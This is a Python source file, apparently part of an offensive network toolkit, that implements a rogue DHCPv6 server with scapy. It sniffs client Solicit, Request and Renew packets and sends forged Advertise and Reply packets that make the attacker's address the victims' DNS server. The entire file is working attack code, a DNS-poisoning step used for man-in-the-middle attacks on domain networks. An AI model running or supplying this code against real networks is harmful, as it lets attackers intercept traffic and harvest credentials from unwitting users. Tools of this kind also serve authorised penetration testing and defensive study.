#!/usr/bin/env python3
import random
import logging
from scapy.all import (
    UDP,
    sendp,
    sr1,
    sniff,
    packet,
    IPv6,
    DHCP6_Advertise,
    DHCP6_Solicit,
    DHCP6OptDNSServers,
    DHCP6OptDNSDomains,
    DHCP6OptIA_NA,
    DHCP6OptIAAddress,
    DHCP6_Request,
    DHCP6_Reply,
    DHCP6OptServerId,
    DHCP6OptClientId,
    DHCP6_Renew,
    DUID_LL,
    ICMPv6EchoRequest,
)
from loguru import logger
from colorama import Fore, Style
from .poisonnetwork import PoisonNetwork
import ipaddress


class DHCP6(PoisonNetwork):
    """DHCP6 poisoner.
    Args:
        ip (str): ipv4 of the attacker.
        ipv6 (str): ipv6 of the attacker.
        mac_address (str): mac of the attacker.
        iface (str): interface of the current subnet used.
        info_logger (logger): Logger for the output.
        domain (str): Target domain.
        ipv6_mask(str): subnet mask for ipv6.
        level (logger): Logger level to display information.
    """

    def __init__(
        self,
        ip: str,
        ipv6: str,
        mac_address: str,
        iface: str,
        info_logger: logger,
        domain: str,
        ipv6_mask: str,
        level: str = "INFO",
    ):
        super().__init__(ip, ipv6, mac_address, iface, info_logger, level)
        self.__domain = f"{domain}."
        self.__used_ipv6 = []
        self.__ipv6_mask = ipv6_mask

    def __check_if_ipv6_exists(self, ipv6: str) -> bool:
        """Method generate a random ipv6.
        Args:
            ipv6 (str): The ipv6 generated.
        Returns:
            (bool): Returns if the ipv6 exists in the subnet.

        """

        reply = sr1(
            IPv6(dst=ipv6) / ICMPv6EchoRequest(),
            timeout=1,
            verbose=False,
        )
        return reply is not None

    def __random_ipv6_addr(self, network: str) -> str:
        """Method generate a random ipv6.
        Returns:
            (str): Returns the dhcp6 optional address.

        """

        net = ipaddress.IPv6Network(network)
        addr_no = random.randint(0, net.num_addresses)
        network_int = int.from_bytes(net.network_address.packed, byteorder="big")
        addr_int = network_int + addr_no
        addr = ipaddress.IPv6Address(addr_int.to_bytes(16, byteorder="big"))
        return str(addr)

    def __generate_ipv6(self) -> str:
        """Method to check the generation and existence of an IPv6 address.
        Returns:
            (str): [Returns the dhcp6 optional address]

        """
        new_ipv6 = self.__random_ipv6_addr(self.__ipv6_mask)
        while self.__check_if_ipv6_exists(new_ipv6):
            new_ipv6 = self.__random_ipv6_addr(self.__ipv6_mask)
        self.__used_ipv6.append(new_ipv6)
        return new_ipv6

    def __generate_ipv6_address(self) -> DHCP6OptIAAddress:
        """Method to return the ipv6 suggested.
        Returns:
            (DHCP6OptIAAddress): Returns the dhcp6 optional address.

        """

        return DHCP6OptIAAddress(addr=self.__generate_ipv6(), preflft=300, validlft=300)

    def __server_duid(self) -> DUID_LL:
        """Method to create the server identifier.
        Returns:
            (DUID_LL): Returns the server identifier.

        """
        return DUID_LL(lladdr=self.mac_address)

    def __advertise_packet(self, pkt: packet, response: packet) -> packet:
        """Method to create advertise packets after request packet.

        Args:
            pkt (packet): Sniffed packet.
            response (packet): Malicious packet.
        Returns:
            packet: Return the modified packet
        """
        response /= DHCP6_Advertise(trid=pkt[DHCP6_Solicit].trid)
        response /= DHCP6OptClientId(duid=pkt[DHCP6_Solicit].duid)
        response /= DHCP6OptServerId(duid=self.__server_duid())
        return self.__info_requested(response, pkt)

    def __reply_packet_after_request(self, pkt: packet, response: packet) -> packet:
        """Method to create reply packets after request packet.

        Args:
            pkt (packet): Sniffed packet.
            response (packet): Malicious packet.
        Returns:
            packet: Returns the modified packet.
        """

        return self.__common_format_request_renew(pkt, DHCP6_Request, response)

    def __reply_packet_after_renew(self, pkt: packet, response: packet) -> packet:
        """Method to create reply packets after a renew packet.

        Args:
            pkt (packet): Sniffed packet.
            response (packet): Malicious packet.
        Returns:
            packet: Returns the modified packet.

        """

        return self.__common_format_request_renew(pkt, DHCP6_Renew, response)

    def __common_format_request_renew(
        self, pkt: packet, message_type, response: packet
    ) -> packet:
        """Information requested to create the package that is the same in
        both the renew type message and the request type.

        Args:
            pkt (packet): Sniffed packet.
            message_type (_type_): Message Type.
            response (packet): Malicious packet.

        Returns:
            packet: Returns the modified packet.
        """
        response /= DHCP6_Reply(trid=pkt[message_type].trid)
        response /= DHCP6OptClientId(duid=pkt[DHCP6OptClientId].duid)
        response /= DHCP6OptServerId(duid=pkt[DHCP6OptServerId].duid)
        return self.__info_requested(response, pkt)

    def __info_requested(self, response: packet, pkt: packet) -> packet:
        """Information requested by the client.

        Args:
            response (packet): Sniffed packet.
            pkt (packet): Message Type.

        Returns:
            packet: Returns the modified packet.
        """
        response /= DHCP6OptDNSServers(dnsservers=[self.ipv6])
        response /= DHCP6OptDNSDomains(dnsdomains=[self.__domain])
        response /= DHCP6OptIA_NA(
            iaid=pkt[DHCP6OptIA_NA].iaid,
            T1=200,
            T2=250,
            ianaopts=self.__generate_ipv6_address(),
        )

        return response

    def __transport_layer(self, response: packet) -> packet:
        """Method to create the transport layer of the response packet.

        Args:
            pkt (packet): Sniffed packet.
            response (packet): Malicious packet.
        Returns:
            packet: Returns the modified packet.


        """

        response /= UDP(sport=547, dport=546)
        return response

    def __application_layer(self, pkt: packet, response: packet) -> packet:
        """Method to create the application layer of the response packet.

        Args:
            pkt (packet): Sniffed packet.
            response (packet): Malicious packet.
        Returns:
            packet: Returns the packet modified packet.


        """

        if pkt.haslayer(DHCP6_Solicit):
            self.info_logger.log(
                self.logger_level,
                f"{Fore.CYAN}(DHCP6)Capturing SOLICIT packet from {pkt[IPv6].src}{Style.RESET_ALL}",
            )
            response = self.__advertise_packet(pkt, response)
        if pkt.haslayer(DHCP6_Request):
            self.info_logger.log(
                self.logger_level,
                f"{Fore.CYAN}(DHCP6)Capturing REQUEST packet from {pkt[IPv6].src}{Style.RESET_ALL}",
            )
            response = self.__reply_packet_after_request(pkt, response)

        if pkt.haslayer(DHCP6_Renew):
            self.info_logger.log(
                self.logger_level,
                f"{Fore.CYAN}(DHCP6)Capturing RENEW packet from {pkt[IPv6].src}{Style.RESET_ALL}",
            )
            response = self.__reply_packet_after_renew(pkt, response)

        return response

    def __send_packet(self, response: packet, ip_of_the_packet: str) -> None:
        """Method to send the malicious packet to the victim.

        Args:
            response (packet): Malicious packet.
            ip_of_the_packet (str): ipv4 of the victim.
        """
        self.info_logger.debug("Packet crafted: ")
        self.info_logger.debug(response.summary())
        if response.haslayer(DHCP6_Advertise):
            self.info_logger.log(
                self.logger_level,
                f"{Fore.CYAN}(DHCP6) Sending dhcp6 ADVERTISE packet to {ip_of_the_packet}{Style.RESET_ALL}",
            )
        else:
            self.info_logger.log(
                self.logger_level,
                f"{Fore.CYAN}(DHCP6) Sending dhcp6 REPLY packet to {ip_of_the_packet}{Style.RESET_ALL}",
            )

        sendp(response, verbose=False)

    def __filter_for_dhcp6(self, pkt: packet) -> bool:
        """Filter by sniffed packets of interest.

        Args:
            pkt (packet): Sniffed packet.

        Returns:
            bool: If the packet is asking for a network resource.
        """
        return (
            pkt.haslayer(IPv6)
            and pkt[IPv6].dst == "ff02::1:2"
            and (
                pkt.haslayer(DHCP6_Request)
                or pkt.haslayer(DHCP6_Solicit)
                or pkt.haslayer(DHCP6_Renew)
            )
        )

    def __craft_malicious_packets(self, pkt: packet) -> None:
        """Method to craft a malicious packet.

        Args:
            pkt (packet): Sniffed packet.
        """
        if self.__filter_for_dhcp6(pkt):
            response = self._data_link_layer(pkt)
            response, ip_of_the_packet = self._network_layer(pkt, response)
            response = self.__transport_layer(response)
            response = self.__application_layer(pkt, response)
            self.__send_packet(response, ip_of_the_packet)

    def start_dhcp6_poisoning(self) -> None:
        """Method to start the poisoner."""
        self.info_logger.log(
            self.logger_level, f"Starting dhcp6 rogue to attack {self.__domain}"
        )
        logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
        sniff(
            filter="udp and port 547",
            iface=self.iface,
            prn=self.__craft_malicious_packets,
            store=0,
        )
